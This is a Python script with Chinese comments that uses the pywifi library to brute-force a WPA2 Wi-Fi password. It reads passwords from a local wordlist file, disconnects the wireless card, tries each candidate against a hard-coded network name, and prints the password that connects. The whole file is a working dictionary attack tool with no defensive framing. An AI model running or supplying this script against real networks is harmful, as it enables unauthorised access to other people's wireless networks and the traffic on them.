from tkinter import *
from pywifi import const
import pywifi
import time


# 主要步骤：
# 1、获取第一个无线网卡
# 2、断开所有的wifi
# 3、读取密码本
# 4、设置睡眠时间

# 测试连接
def wificonnect(str, wifiname):
    # 窗口无线对象
    wifi = pywifi.PyWiFi()
    # 抓取第一个无线网卡
    ifaces = wifi.interfaces()[0]
    # 断开所有的wifi
    ifaces.disconnect()
    time.sleep(1)
    if ifaces.status() == const.IFACE_DISCONNECTED:
        # 创建wifi连接文件
        profile = pywifi.Profile()
        profile.ssid = wifiname
        # wifi的加密算法
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        # wifi的密码
        profile.key = str
        # 网卡的开发
        profile.auth = const.AUTH_ALG_OPEN
        # 加密单元,这里需要写点加密单元否则无法连接
        profile.cipher = const.CIPHER_TYPE_CCMP

        # 删除所有的wifi文件
        ifaces.remove_all_network_profiles()
        # 设置新的连接文件
        tep_profile = ifaces.add_network_profile(profile)
        # 连接
        ifaces.connect(tep_profile)
        time.sleep(3)

        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False


def readPwd():
    # 获取wiif名称
    # wifiname = 'TP-LINK_501_VOID'
    wifiname = 'CJA '

    path = r'./wifipwd.txt'
    file = open(path, 'r')
    while True:
        try:
            # 读取
            mystr = file.readline().strip()
            # 测试连接
            bool = wificonnect(mystr, wifiname)
            if bool:
                print('密码正确' + mystr)
                file.close()
                break
            else:
                print('密码错误' + mystr)
        except:
            continue

def main():
    start_time = time.time()
    readPwd()
    end_time = time.time()
    project_time = end_time - start_time
    print('程序用时', project_time)


if __name__ == '__main__':
    main()